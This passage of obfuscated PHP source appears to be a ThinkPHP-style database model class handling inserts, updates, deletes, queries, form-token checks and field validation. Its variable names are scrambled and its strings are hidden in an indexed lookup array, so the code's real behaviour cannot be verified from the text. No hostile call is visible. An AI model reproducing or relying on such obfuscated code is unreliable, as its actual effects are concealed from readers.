$²ÌˆºÓï; if (is_array($²ÌˆºÓï)) { $äí‡ô‹ = $²ÌˆºÓï[1]; $²ÌˆºÓï = $²ÌˆºÓï[0]; } $êõøê®÷ = count($õâÂõƒë) - 1; if (isset($õâÂõƒë[$êõøê®÷]) && $õâÂõƒë[$êõøê®÷] === $²ÌˆºÓï) { think_exception(__CLASS__ . $€àË•š¹[4] . $²ÌˆºÓï . think_lang($€àË•š¹[265])); return; } $õâÂõƒë[] = $²ÌˆºÓï; if (method_exists($this, $€àË•š¹[266])) { $·™‚ÚÛŒ = call_user_func_array(array($this, $€àË•š¹[267]), array($äí‡ô‹, $õâÂõƒë)); if (!is_null($·™‚ÚÛŒ) && $·™‚ÚÛŒ !== !1) { return $·™‚ÚÛŒ; } } $Á·»œñØ = call_user_func_array(array($this, $²ÌˆºÓï), $õâÂõƒë); if (method_exists($this, $€àË•š¹[268])) { $·™‚ÚÛŒ = call_user_func_array(array($this, $€àË•š¹[269]), array($äí‡ô‹, $õâÂõƒë, $Á·»œñØ)); if ($·™‚ÚÛŒ) { return $·™‚ÚÛŒ; } } return $Á·»œñØ; } protected function _initialize() { } protected function _facade($¹˜¤ÙÚà) { $ß±ÂâÓ¨ =& $_SERVER[ñˆ‹ß¿÷]; if (!empty($this->fields)) { foreach ($¹˜¤ÙÚà as $ïâˆö€¨ => $ìßóÜ£ï) { if (is_array($this->fields) && !in_array($ïâˆö€¨, $this->fields, !0)) { unset($¹˜¤ÙÚà[$ïâˆö€¨]); } elseif (is_scalar($ìßóÜ£ï)) { $this->_parseType($¹˜¤ÙÚà, $ïâˆö€¨); } } } if (!empty($this->options[$ß±ÂâÓ¨[270]])) { $¹˜¤ÙÚà = array_map($this->options[$ß±ÂâÓ¨[270]], $¹˜¤ÙÚà); unset($this->options[$ß±ÂâÓ¨[270]]); } $this->_beforeWrite($¹˜¤ÙÚà); return $¹˜¤ÙÚà; } protected function _beforeWrite(&$ä‹²å©µ) { } public function add($ğ¬‹™®å = '', $¬ÆøŒûî = array(), $•Û’‘®† = false) { if (empty($ğ¬‹™®å)) { if (!empty($this->data)) { $ğ¬‹™®å = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ñˆ‹ß¿÷][271]); return !1; } } $¬ÆøŒûî = $this->_parseOptions($¬ÆøŒûî); $ğ¬‹™®å = $this->_facade($ğ¬‹™®å); if (!1 === $this->_beforeInsert($ğ¬‹™®å, $¬ÆøŒûî)) { return !1; } $–Ù¹‹ö = $this->db->insert($ğ¬‹™®å, $¬ÆøŒûî, $•Û’‘®†); if (!1 !== $–Ù¹‹ö) { $²ÕËş = $this->getLastInsID(); if ($²ÕËş) { $ğ¬‹™®å[$this->getPk()] = $²ÕËş; $this->_after_insert($ğ¬‹™®å, $¬ÆøŒûî); return $²ÕËş; } $this->_after_insert($ğ¬‹™®å, $¬ÆøŒûî); } return $–Ù¹‹ö; } protected function _beforeInsert(&$íºÌ½Û¹, $ó÷Ëø“Ã) { } protected function _after_insert($‚ŒñÖûù, $–Ú×Ú¹¬) { } public function addAll($ÒŸ£öØœ, $€¦®ÅÈ = array(), $Ÿµ–Ğ¼‚ = false) { $ÂŒîäÄ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($ÒŸ£öØœ)) { $this->error = think_lang($ÂŒîäÄ[271]); return !1; } $€¦®ÅÈ = $this->_parseOptions($€¦®ÅÈ); foreach ($ÒŸ£öØœ as $¥ã¿ş£ => $’àÖäŠŸ) { $ÒŸ£öØœ[$¥ã¿ş£] = $this->_facade($’àÖäŠŸ); } if (method_exists($this->db, $ÂŒîäÄ[272])) { $ß·Îøª‡ = $this->db->insertAll($ÒŸ£öØœ, $€¦®ÅÈ, $Ÿµ–Ğ¼‚); } else { $this->startTrans(); foreach ($ÒŸ£öØœ as $¥ã¿ş£ => $’àÖäŠŸ) { $ß·Îøª‡ = $this->db->insert($’àÖäŠŸ, $€¦®ÅÈ, $Ÿµ–Ğ¼‚); } $this->commit(); } if (!1 !== $ß·Îøª‡) { $©øñÊ§¶ = $this->getLastInsID(); if ($©øñÊ§¶) { return $©øñÊ§¶; } } return $ß·Îøª‡; } public function selectAdd($ŒÔ¤âış = '', $ˆÅıÆ‡Ä = '', $¨ÆÕ¾ = array()) { $Ì¶ìÀèÀ =& $_SERVER[ñˆ‹ß¿÷]; $¨ÆÕ¾ = $this->_parseOptions($¨ÆÕ¾); if (!1 === ($ôÛğ©ø» = $this->db->selectInsert($ŒÔ¤âış ? $ŒÔ¤âış : $¨ÆÕ¾[$Ì¶ìÀèÀ[273]], $ˆÅıÆ‡Ä ? $ˆÅıÆ‡Ä : $this->getTableName(), $¨ÆÕ¾))) { $this->error = think_lang($Ì¶ìÀèÀ[274]); return !1; } else { return $ôÛğ©ø»; } } public function save($»¢üÊù = '', $ÚÁ‚‹€Œ = array()) { $“Á‚½©ò =& $_SERVER[ñˆ‹ß¿÷]; if (empty($»¢üÊù)) { if (!empty($this->data)) { $»¢üÊù = $this->data; $this->data = array(); } else { $this->error = think_lang($“Á‚½©ò[271]); return !1; } } $»¢üÊù = $this->_facade($»¢üÊù); $ÚÁ‚‹€Œ = $this->_parseOptions($ÚÁ‚‹€Œ); $µĞİóÌç = $this->getPk(); if (!isset($ÚÁ‚‹€Œ[$“Á‚½©ò[275]])) { if (isset($»¢üÊù[$µĞİóÌç])) { $á¼ å•—[$µĞİóÌç] = $»¢üÊù[$µĞİóÌç]; $ÚÁ‚‹€Œ[$“Á‚½©ò[275]] = $á¼ å•—; unset($»¢üÊù[$µĞİóÌç]); } else { $this->error = think_lang($“Á‚½©ò[274]); return !1; } } if (is_array($ÚÁ‚‹€Œ[$“Á‚½©ò[275]]) && isset($ÚÁ‚‹€Œ[$“Á‚½©ò[275]][$µĞİóÌç])) { $¼Å’ÖÈ… = $ÚÁ‚‹€Œ[$“Á‚½©ò[275]][$µĞİóÌç]; } if (!1 === $this->_beforeUpdate($»¢üÊù, $ÚÁ‚‹€Œ)) { return !1; } $üÂÍ„³ = $this->db->update($»¢üÊù, $ÚÁ‚‹€Œ); if (!1 !== $üÂÍ„³) { if (isset($¼Å’ÖÈ…)) { $»¢üÊù[$µĞİóÌç] = $¼Å’ÖÈ…; } $this->_afterUpdate($»¢üÊù, $ÚÁ‚‹€Œ); } return $üÂÍ„³; } protected function _beforeUpdate(&$±É›§§, $¨×ï«½») { } protected function _afterUpdate($–ÖŸâı, $Â¢ş») { } public function delete($Ğ‹“³ = array()) { $ëˆÕ¯àØ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($Ğ‹“³) && empty($this->options[$ëˆÕ¯àØ[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ıÁûÑÁ‹ = $this->getPk(); if (is_numeric($Ğ‹“³) || is_string($Ğ‹“³)) { if (strpos($Ğ‹“³, $ëˆÕ¯àØ[50])) { $‚Ïõ[$ıÁûÑÁ‹] = array($ëˆÕ¯àØ[276], $Ğ‹“³); } else { $‚Ïõ[$ıÁûÑÁ‹] = $Ğ‹“³; } $this->options[$ëˆÕ¯àØ[275]] = $‚Ïõ; } $Ğ‹“³ = $this->_parseOptions(); if (is_array($Ğ‹“³[$ëˆÕ¯àØ[275]]) && isset($Ğ‹“³[$ëˆÕ¯àØ[275]][$ıÁûÑÁ‹])) { $Ø‡ï“ùø = $Ğ‹“³[$ëˆÕ¯àØ[275]][$ıÁûÑÁ‹]; } $ğï‚ÍÉÈ = $this->db->delete($Ğ‹“³); if (!1 !== $ğï‚ÍÉÈ) { $ –š³ = array(); if (isset($Ø‡ï“ùø)) { $ –š³[$ıÁûÑÁ‹] = $Ø‡ï“ùø; } $this->_after_delete($ –š³, $Ğ‹“³); } return $ğï‚ÍÉÈ; } protected function _after_delete($ïè•ş€¸, $¨Éâ•·§) { } public function select($œœÚÈ™á = array()) { $İèŞÁóº =& $_SERVER[ñˆ‹ß¿÷]; if (is_string($œœÚÈ™á) || is_numeric($œœÚÈ™á)) { $¹•ÂäÔ‹ = $this->getPk(); if (strpos($œœÚÈ™á, $İèŞÁóº[50])) { $¢±§º•[$¹•ÂäÔ‹] = array($İèŞÁóº[276], $œœÚÈ™á); } else { $¢±§º•[$¹•ÂäÔ‹] = $œœÚÈ™á; } $this->options[$İèŞÁóº[275]] = $¢±§º•; } elseif (!1 === $œœÚÈ™á) { $œœÚÈ™á = $this->_parseOptions(); return $İèŞÁóº[277] . $this->db->buildSelectSql($œœÚÈ™á) . $İèŞÁóº[278]; } $œœÚÈ™á = $this->_parseOptions(); $­»óä½¹ = $this->db->select($œœÚÈ™á); if (!1 === $­»óä½¹) { return !1; } if (empty($­»óä½¹)) { return null; } $this->_afterSelect($­»óä½¹, $œœÚÈ™á); return $­»óä½¹; } protected function _afterSelect(&$¸ùüªÑ, $Éùšåö×) { } public function buildSql($†Ñ÷ÖÖÈ = array()) { $ÄœÄíÔç =& $_SERVER[ñˆ‹ß¿÷]; $†Ñ÷ÖÖÈ = $this->_parseOptions($†Ñ÷ÖÖÈ); return $ÄœÄíÔç[277] . $this->db->buildSelectSql($†Ñ÷ÖÖÈ) . $ÄœÄíÔç[278]; } public function optionsValue($Ğ¼âòÉ¥ = null) { if (is_null($Ğ¼âòÉ¥)) { return $this->options; } elseif (is_array($Ğ¼âòÉ¥)) { $this->options = array_merge($this->options, $Ğ¼âòÉ¥); } } protected function _parseOptions($Ç§Äíğƒ = array()) { $àø‰™’” =& $_SERVER[ñˆ‹ß¿÷]; if (is_array($Ç§Äíğƒ)) { $Ç§Äíğƒ = array_merge($this->options, $Ç§Äíğƒ); } $this->options = array(); if (!isset($Ç§Äíğƒ[$àø‰™’”[279]])) { $Ç§Äíğƒ[$àø‰™’”[279]] = $this->getTableName(); $‚ÌëáĞî = $this->fields; } else { $‚ÌëáĞî = $this->getDbFields(); } if (!empty($Ç§Äíğƒ[$àø‰™’”[280]])) { $Ç§Äíğƒ[$àø‰™’”[279]] .= $àø‰™’”[53] . $Ç§Äíğƒ[$àø‰™’”[280]]; } $Ç§Äíğƒ[$àø‰™’”[281]] = $this->name; if (isset($Ç§Äíğƒ[$àø‰™’”[275]]) && is_array($Ç§Äíğƒ[$àø‰™’”[275]]) && !empty($‚ÌëáĞî) && !isset($Ç§Äíğƒ[$àø‰™’”[282]]) && !isset($Ç§Äíğƒ[$àø‰™’”[279]])) { foreach ($Ç§Äíğƒ[$àø‰™’”[275]] as $ıßá§¯‹ => $ìÉ»šâ¢) { $ıßá§¯‹ = trim($ıßá§¯‹); if (in_array($ıßá§¯‹, $‚ÌëáĞî, !0)) { if (is_scalar($ìÉ»šâ¢)) { $this->_parseType($Ç§Äíğƒ[$àø‰™’”[275]], $ıßá§¯‹); } } elseif (!is_numeric($ıßá§¯‹) && $àø‰™’”[11] != substr($ıßá§¯‹, 0, 1) && !1 === strpos($ıßá§¯‹, $àø‰™’”[10]) && !1 === strpos($ıßá§¯‹, $àø‰™’”[260]) && !1 === strpos($ıßá§¯‹, $àø‰™’”[283]) && !1 === strpos($ıßá§¯‹, $àø‰™’”[284])) { unset($Ç§Äíğƒ[$àø‰™’”[275]][$ıßá§¯‹]); } } } $this->_options_filter($Ç§Äíğƒ); return $Ç§Äíğƒ; } protected function _options_filter(&$… ¿Â÷Ù) { } protected function _parseType(&$¢üš¥ù£, $–İı×) { $¶”¥äİŞ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($this->options[$¶”¥äİŞ[285]][$¶”¥äİŞ[4] . $–İı×])) { $É²ÆÎ” = strtolower($this->fields[$¶”¥äİŞ[252]][$–İı×]); if (!1 !== strpos($É²ÆÎ”, $¶”¥äİŞ[286])) { } elseif (!1 === strpos($É²ÆÎ”, $¶”¥äİŞ[287]) && !1 !== strpos($É²ÆÎ”, $¶”¥äİŞ[288])) { $¢üš¥ù£[$–İı×] = intval($¢üš¥ù£[$–İı×]); } elseif (!1 !== strpos($É²ÆÎ”, $¶”¥äİŞ[289]) || !1 !== strpos($É²ÆÎ”, $¶”¥äİŞ[290])) { $¢üš¥ù£[$–İı×] = floatval($¢üš¥ù£[$–İı×]); } elseif (!1 !== strpos($É²ÆÎ”, $¶”¥äİŞ[291])) { $¢üš¥ù£[$–İı×] = (bool) $¢üš¥ù£[$–İı×]; } } } public function find($‰¸­ƒê³ = array()) { $ôŸ‹ŞÁ =& $_SERVER[ñˆ‹ß¿÷]; if (is_numeric($‰¸­ƒê³) || is_string($‰¸­ƒê³)) { $ŸË®µ°Ä[$this->getPk()] = intval($‰¸­ƒê³); $this->options[$ôŸ‹ŞÁ[275]] = $ŸË®µ°Ä; } $this->options[$ôŸ‹ŞÁ[292]] = 1; $‰¸­ƒê³ = $this->_parseOptions(); $ìÚ°ğôõ = $this->db->select($‰¸­ƒê³); if (!1 === $ìÚ°ğôõ) { return !1; } if (empty($ìÚ°ğôõ)) { return null; } $this->data = $ìÚ°ğôõ[0]; $this->_afterFind($this->data, $‰¸­ƒê³); if (!empty($this->options[$ôŸ‹ŞÁ[293]])) { return $this->returnResult($this->data, $this->options[$ôŸ‹ŞÁ[293]]); } return $this->data; } protected function _afterFind(&$ó¶±ó·Õ, $¡Îáúµ) { } protected function returnResult($Ó¨³Ñ³–, $³”©€–ˆ = '') { $°’ÆËÇü =& $_SERVER[ñˆ‹ß¿÷]; if ($³”©€–ˆ) { if (is_callable($³”©€–ˆ)) { return call_user_func($³”©€–ˆ, $Ó¨³Ñ³–); } switch (strtolower($³”©€–ˆ)) { case $°’ÆËÇü[294]: return json_encode($Ó¨³Ñ³–); case $°’ÆËÇü[295]: return xml_encode($Ó¨³Ñ³–); } } return $Ó¨³Ñ³–; } public function parseFieldsMap($ÌäíÇ¡®, $ê»¾¹úä = 1) { if (!empty($this->_map)) { foreach ($this->_map as $å‹ôÅÆÛ => $ç°æäù) { if ($ê»¾¹úä == 1) { if (isset($ÌäíÇ¡®[$ç°æäù])) { $ÌäíÇ¡®[$å‹ôÅÆÛ] = $ÌäíÇ¡®[$ç°æäù]; unset($ÌäíÇ¡®[$ç°æäù]); } } else { if (isset($ÌäíÇ¡®[$å‹ôÅÆÛ])) { $ÌäíÇ¡®[$ç°æäù] = $ÌäíÇ¡®[$å‹ôÅÆÛ]; unset($ÌäíÇ¡®[$å‹ôÅÆÛ]); } } } } return $ÌäíÇ¡®; } public function setField($¦‘¯¡¦”, $’¼ÂˆÓ = '') { if (is_array($¦‘¯¡¦”)) { $×ØÎÖ”ª = $¦‘¯¡¦”; } else { $×ØÎÖ”ª[$¦‘¯¡¦”] = $’¼ÂˆÓ; } return $this->save($×ØÎÖ”ª); } public function setAdd($–®¯ÈÑ, $¥ñÉˆ‹ = 1) { $‡­·‚Ğé =& $_SERVER[ñˆ‹ß¿÷]; $¿¼÷ş’ø = $–®¯ÈÑ . $‡­·‚Ğé[296] . $¥ñÉˆ‹; if ($¥ñÉˆ‹ < 0) { $¿¼÷ş’ø = $–®¯ÈÑ . $¥ñÉˆ‹; } return $this->setField($–®¯ÈÑ, array($‡­·‚Ğé[297], $¿¼÷ş’ø)); } public function getField($¿ë·¨¤, $Ûµ·„Öì = null) { $õ‚Ù×Íõ =& $_SERVER[ñˆ‹ß¿÷]; $û’´ìÒ[$õ‚Ù×Íõ[273]] = $¿ë·¨¤; $û’´ìÒ = $this->_parseOptions($û’´ìÒ); $¿ë·¨¤ = trim($¿ë·¨¤); if (strpos($¿ë·¨¤, $õ‚Ù×Íõ[50])) { if (!isset($û’´ìÒ[$õ‚Ù×Íõ[292]])) { $û’´ìÒ[$õ‚Ù×Íõ[292]] = is_numeric($Ûµ·„Öì) ? $Ûµ·„Öì : $õ‚Ù×Íõ[12]; } $º§æ•Â = $this->db->select($û’´ìÒ); if (!empty($º§æ•Â)) { $¾³æüæ = explode($õ‚Ù×Íõ[50], $¿ë·¨¤); $¿ë·¨¤ = array_keys($º§æ•Â[0]); $™ïŠî´ = array_shift($¿ë·¨¤); $›¡¿îõİ = array_shift($¿ë·¨¤); $ì€ºİ¬¶ = array(); $¾½ìŞû½ = count($¾³æüæ); foreach ($º§æ•Â as $ÊšçÍØü) { $–» ë½ê = $ÊšçÍØü[$™ïŠî´]; if (2 == $¾½ìŞû½) { $ì€ºİ¬¶[$–» ë½ê] = $ÊšçÍØü[$›¡¿îõİ]; } else { $ì€ºİ¬¶[$–» ë½ê] = is_string($Ûµ·„Öì) ? implode($Ûµ·„Öì, $ÊšçÍØü) : $ÊšçÍØü; } } return $ì€ºİ¬¶; } } else { if (!0 !== $Ûµ·„Öì) { $û’´ìÒ[$õ‚Ù×Íõ[292]] = is_numeric($Ûµ·„Öì) ? $Ûµ·„Öì : 1; } if ($Ûµ·„Öì === $õ‚Ù×Íõ[255]) { unset($û’´ìÒ[$õ‚Ù×Íõ[292]]); } $ÊšçÍØü = $this->db->select($û’´ìÒ); if (!empty($ÊšçÍØü)) { if ($Ûµ·„Öì === $õ‚Ù×Íõ[255]) { return reset($ÊšçÍØü[0]); } if (!0 !== $Ûµ·„Öì && 1 == $û’´ìÒ[$õ‚Ù×Íõ[292]]) { return reset($ÊšçÍØü[0]); } foreach ($ÊšçÍØü as $–²Ïê§) { $üÇÚ¯ßó[] = $–²Ïê§[$¿ë·¨¤]; } return $üÇÚ¯ßó; } } return null; } public function create($•Áö—¤• = '', $ÔâŒ«¹ = '') { $õü®Õå =& $_SERVER[ñˆ‹ß¿÷]; if (empty($•Áö—¤•)) { $•Áö—¤• = $_POST; } elseif (is_object($•Áö—¤•)) { $•Áö—¤• = get_object_vars($•Áö—¤•); } if (empty($•Áö—¤•) || !is_array($•Áö—¤•)) { $this->error = think_lang($õü®Õå[271]); return !1; } $•Áö—¤• = $this->parseFieldsMap($•Áö—¤•, 0); $ÔâŒ«¹ = $ÔâŒ«¹ ? $ÔâŒ«¹ : (!empty($•Áö—¤•[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$õü®Õå[273]])) { $ÙĞ·‹› = $this->options[$õü®Õå[273]]; unset($this->options[$õü®Õå[273]]); } elseif ($ÔâŒ«¹ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÙĞ·‹› = $this->insertFields; } elseif ($ÔâŒ«¹ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÙĞ·‹› = $this->updateFields; } if (isset($ÙĞ·‹›)) { if (is_string($ÙĞ·‹›)) { $ÙĞ·‹› = explode($õü®Õå[50], $ÙĞ·‹›); } if (think_config($õü®Õå[298])) { $ÙĞ·‹›[] = think_config($õü®Õå[299]); } foreach ($•Áö—¤• as $¯Í‡ÇÀ => $ˆ÷ıø®) { if (!in_array($¯Í‡ÇÀ, $ÙĞ·‹›)) { unset($•Áö—¤•[$¯Í‡ÇÀ]); } } } if (!$this->autoValidation($•Áö—¤•, $ÔâŒ«¹)) { return !1; } if (!$this->autoCheckToken($•Áö—¤•)) { $this->error = think_lang($õü®Õå[300]); return !1; } if ($this->autoCheckFields) { $ÙĞ·‹› = $this->getDbFields(); foreach ($•Áö—¤• as $¯Í‡ÇÀ => $ˆ÷ıø®) { if (!in_array($¯Í‡ÇÀ, $ÙĞ·‹›)) { unset($•Áö—¤•[$¯Í‡ÇÀ]); } elseif (MAGIC_QUOTES_GPC && is_string($ˆ÷ıø®)) { $•Áö—¤•[$¯Í‡ÇÀ] = stripslashes($ˆ÷ıø®); } } } $this->autoOperation($•Áö—¤•, $ÔâŒ«¹); $this->data = $•Áö—¤•; return $•Áö—¤•; } public function autoCheckToken($§±€èÇ›) { $â½öäÓ’ =& $_SERVER[ñˆ‹ß¿÷]; if (isset($this->options[$â½öäÓ’[301]]) && !$this->options[$â½öäÓ’[301]]) { return !0; } if (think_config($â½öäÓ’[298])) { $¬Ñ°Üâè = think_config($â½öäÓ’[299]); if (!isset($§±€èÇ›[$¬Ñ°Üâè]) || Session::get($¬Ñ°Üâè)) { return !1; } list($‘Ëòêµ, $ÌÒï¿ş¤) = explode($â½öäÓ’[11], $§±€èÇ›[$¬Ñ°Üâè]); if ($ÌÒï¿ş¤ && Session::get($¬Ñ°Üâè . $â½öäÓ’[10] . $‘Ëòêµ) === $ÌÒï¿ş¤) { Session::remove($¬Ñ°Üâè . $â½öäÓ’[10] . $‘Ëòêµ); return !0; } if (think_config($â½öäÓ’[302])) { Session::remove($¬Ñ°Üâè . $â½öäÓ’[10] . $‘Ëòêµ); } return !1; } return !0; } public function regex($ŒÆ±Ç‡¦, $¸ÛöÚç) { $ÊÎäÂóÂ =& $_SERVER[ñˆ‹ß¿÷]; $ÜçØÓ— = array($ÊÎäÂóÂ[303] => $ÊÎäÂóÂ[304], $ÊÎäÂóÂ[305] => $ÊÎäÂóÂ[306], $ÊÎäÂóÂ[307] => $ÊÎäÂóÂ[308], $ÊÎäÂóÂ[309] => $ÊÎäÂóÂ[310], $ÊÎäÂóÂ[311] => $ÊÎäÂóÂ[312], $ÊÎäÂóÂ[313] => $ÊÎäÂóÂ[314], $ÊÎäÂóÂ[315] => $ÊÎäÂóÂ[316], $ÊÎäÂóÂ[290] => $ÊÎäÂóÂ[317], $ÊÎäÂóÂ[318] => $ÊÎäÂóÂ[319]); if (isset($ÜçØÓ—[strtolower($¸ÛöÚç)])) { $¸ÛöÚç = $ÜçØÓ—[strtolower($¸ÛöÚç)]; } return preg_match($¸ÛöÚç, $ŒÆ±Ç‡¦) === 1; } private function autoOperation(&$²ØæÈ, $‡Á “ç÷) { $ĞòË¶“ =& $_SERVER[ñˆ‹ß¿÷]; if (!empty($this->options[$ĞòË¶“[320]])) { $ù¼ìÁÊ× = $this->options[$ĞòË¶“[320]]; unset($this->options[$ĞòË¶“[320]]); } elseif (!empty($this->_auto)) { $ù¼ìÁÊ× = $this->_auto; } if (isset($ù¼ìÁÊ×)) { foreach ($ù¼ìÁÊ× as $óûµ¸³À) { if (empty($óûµ¸³À[2])) { $óûµ¸³À[2] = THINK_MODEL_INSERT; } if ($‡Á “ç÷ == $óûµ¸³À[2] || $óûµ¸³À[2] == THINK_MODEL_BOTH) { switch (trim($óûµ¸³À[3])) { case $ĞòË¶“[321]: case $ĞòË¶“[322]: $½¶¨·Æ = isset($óûµ¸³À[4]) ? (array) $óûµ¸³À[4] : array(); if (isset($²ØæÈ[$óûµ¸³À[0]])) { array_unshift($½¶¨·Æ, $²ØæÈ[$óûµ¸³À[0]]); } if ($ĞòË¶“[321] == $óûµ¸³À[3]) { $²ØæÈ[$óûµ¸³À[0]] = call_user_func_array($óûµ¸³À[1], $½¶¨·Æ); } else { $²ØæÈ[$óûµ¸³À[0]] = call_user_func_array(array(&$this, $óûµ¸³À[1]), $½¶¨·Æ); } break; case $ĞòË¶“[273]: $²ØæÈ[$óûµ¸³À[0]] = $²ØæÈ[$óûµ¸³À[1]]; break; case $ĞòË¶“[323]: if ($ĞòË¶“[12] === $²ØæÈ[$óûµ¸³À[0]]) { unset($²ØæÈ[$óûµ¸³À[0]]); } break; case $ĞòË¶“[324]: default: $²ØæÈ[$óûµ¸³À[0]] = $óûµ¸³À[1]; } if (!1 === $²ØæÈ[$óûµ¸³À[0]]) { unset($²ØæÈ[$óûµ¸³À[0]]); } } } } return $²ØæÈ; } protected function autoValidation($ÓÉ…üÍ, $ëÌ¤’Û) { $™¾¹¨Ğ© =& $_SERVER[ñˆ‹ß¿÷]; if (!empty($this->options[$™¾¹¨Ğ©[325]])) { $ûó»‡Å” = $this->options[$™¾¹¨Ğ©[325]]; unset($this->options[$™¾¹¨Ğ©[325]]); } elseif (!empty($this->_validate)) { $ûó»‡Å” = $this->_validate; } if (isset($ûó»‡Å”)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ûó»‡Å” as $Ô±åÅ¿Ó => $ŒÏß£Ñß) { if (empty($ŒÏß£Ñß[5]) || $ŒÏß£Ñß[5] == THINK_MODEL_BOTH || $ŒÏß£Ñß[5] == $ëÌ¤’Û) { if (0 == strpos($ŒÏß£Ñß[2], $™¾¹¨Ğ©[326]) && strpos($ŒÏß£Ñß[2], $™¾¹¨Ğ©[327])) { $ŒÏß£Ñß[2] = think_lang(substr($ŒÏß£Ñß[2], 2, -1)); } $ŒÏß£Ñß[3] = isset($ŒÏß£Ñß[3]) ? $ŒÏß£Ñß[3] : THINK_EXISTS_VALIDATE; $ŒÏß£Ñß[4] = isset($ŒÏß£Ñß[4]) ? $ŒÏß£Ñß[4] : $™¾¹¨Ğ©[328]; switch ($ŒÏß£Ñß[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÓÉ…üÍ, $ŒÏß£Ñß)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($™¾¹¨Ğ©[12] != trim($ÓÉ…üÍ[$ŒÏß£Ñß[0]])) { if (!1 === $this->_validationField($ÓÉ…üÍ, $ŒÏß£Ñß)) { return !1; } } break; default: if (isset($ÓÉ…üÍ[$ŒÏß£Ñß[0]])) { if (!1 === $this->_validationField($ÓÉ…üÍ, $ŒÏß£Ñß)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($´¤“’¸, $‘Ê£à½) { if (!1 === $this->_validationFieldItem($´¤“’¸, $‘Ê£à½)) { if ($this->patchValidate) { $this->error[$‘Ê£à½[0]] = $‘Ê£à½[2]; } else { $this->error = $‘Ê£à½[2]; return !1; } } return; } protected function _validationFieldItem($’ÅšüŞá, $è›Úµ™Œ) { $ÀÂ¾ßÔŸ =& $_SERVER[ñˆ‹ß¿÷]; switch (strtolower(trim($è›Úµ™Œ[4]))) { case $ÀÂ¾ßÔŸ[321]: case $ÀÂ¾ßÔŸ[322]: $³è•…î = isset($è›Úµ™Œ[6]) ? (array) $è›Úµ™Œ[6] : array(); if (is_string($è›Úµ™Œ[0]) && strpos($è›Úµ™Œ[0], $ÀÂ¾ßÔŸ[50])) { $è›Úµ™Œ[0] = explode($ÀÂ¾ßÔŸ[50], $è›Úµ™Œ[0]); } if (is_array($è›Úµ™Œ[0])) { foreach ($è›Úµ™Œ[0] as $Ÿé»«†Ì) { $à—¨§[$Ÿé»«†Ì] = $’ÅšüŞá[$Ÿé»«†Ì]; } array_unshift($³è•…î, $à—¨§); } else { array_unshift($³è•…î, $’ÅšüŞá[$è›Úµ™Œ[0]]); } if ($ÀÂ¾ßÔŸ[321] == $è›Úµ™Œ[4]) { return call_user_func_array($è›Úµ™Œ[1], $³è•…î); } else { return call_user_func_array(array(&$this, $è›Úµ™Œ[1]), $³è•…î); } case $ÀÂ¾ßÔŸ[329]: return $’ÅšüŞá[$è›Úµ™Œ[0]] == $’ÅšüŞá[$è›Úµ™Œ[1]]; case $ÀÂ¾ßÔŸ[330]: if (is_string($è›Úµ™Œ[0]) && strpos($è›Úµ™Œ[0], $ÀÂ¾ßÔŸ[50])) { $è›Úµ™Œ[0] = explode($ÀÂ¾ßÔŸ[50], $è›Úµ™Œ[0]); } $òÔêó†Œ = array(); if (is_array($è›Úµ™Œ[0])) { foreach ($è›Úµ™Œ[0] as $Ÿé»«†Ì) { $òÔêó†Œ[$Ÿé»«†Ì] = $’ÅšüŞá[$Ÿé»«†Ì]; } } else { $òÔêó†Œ[$è›Úµ™Œ[0]] = $’ÅšüŞá[$è›Úµ™Œ[0]]; } if (!empty($’ÅšüŞá[$this->getPk()])) { $òÔêó†Œ[$this->getPk()] = array($ÀÂ¾ßÔŸ[331], $’ÅšüŞá[$this->getPk()]); } if ($this->where($òÔêó†Œ)->find()) { return !1; } return !0; default: return $this->check($’ÅšüŞá[$è›Úµ™Œ[0]], $è›Úµ™Œ[1], $è›Úµ™Œ[4]); } } public function check($à ©âò, $¾ƒè¢ê, $Ìú»·ó» = "\162\x65\147\x65\170") { $«Ø‘‘ºÅ =& $_SERVER[ñˆ‹ß¿÷]; $Ìú»·ó» = strtolower(trim($Ìú»·ó»)); switch ($Ìú»·ó») { case $«Ø‘‘ºÅ[7]: case $«Ø‘‘ºÅ[332]: $ó¥ø¯• = is_array($¾ƒè¢ê) ? $¾ƒè¢ê : explode($«Ø‘‘ºÅ[50], $¾ƒè¢ê); return $Ìú»·ó» == $«Ø‘‘ºÅ[7] ? in_array($à ©âò, $ó¥ø¯•) : !in_array($à ©âò, $ó¥ø¯•); case $«Ø‘‘ºÅ[333]: case $«Ø‘‘ºÅ[334]: if (is_array($¾ƒè¢ê)) { $´Âİœ‘ü = $¾ƒè¢ê[0]; $¡‚»£½ = $¾ƒè¢ê[1]; } else { list($´Âİœ‘ü, $¡‚»£½) = explode($«Ø‘‘ºÅ[50], $¾ƒè¢ê); } return $Ìú»·ó» == $«Ø‘‘ºÅ[333] ? $à ©âò >= $´Âİœ‘ü && $à ©âò <= $¡‚»£½ : $à ©âò < $´Âİœ‘ü || $à ©âò > $¡‚»£½; case $«Ø‘‘ºÅ[335]: case $«Ø‘‘ºÅ[336]: return $Ìú»·ó» == $«Ø‘‘ºÅ[335] ? $à ©âò == $¾ƒè¢ê : $à ©âò != $¾ƒè¢ê; case $«Ø‘‘ºÅ[337]: $æÈçÜó = mb_strlen($à ©âò, $«Ø‘‘ºÅ[338]); if (strpos($¾ƒè¢ê, $«Ø‘‘ºÅ[50])) { list($´Âİœ‘ü, $¡‚»£½) = explode($«Ø‘‘ºÅ[50], $¾ƒè¢ê); return $æÈçÜó >= $´Âİœ‘ü && $æÈçÜó <= $¡‚»£½; } else { return $æÈçÜó == $¾ƒè¢ê; } case $«Ø‘‘ºÅ[339]: list($öÆÃÔ, $”‘‹°¡¸) = explode($«Ø‘‘ºÅ[50], $¾ƒè¢ê); if (!is_numeric($öÆÃÔ)) { $öÆÃÔ = strtotime($öÆÃÔ); } if (!is_numeric($”‘‹°¡¸)) { $”‘‹°¡¸ = strtotime($”‘‹°¡¸); } return 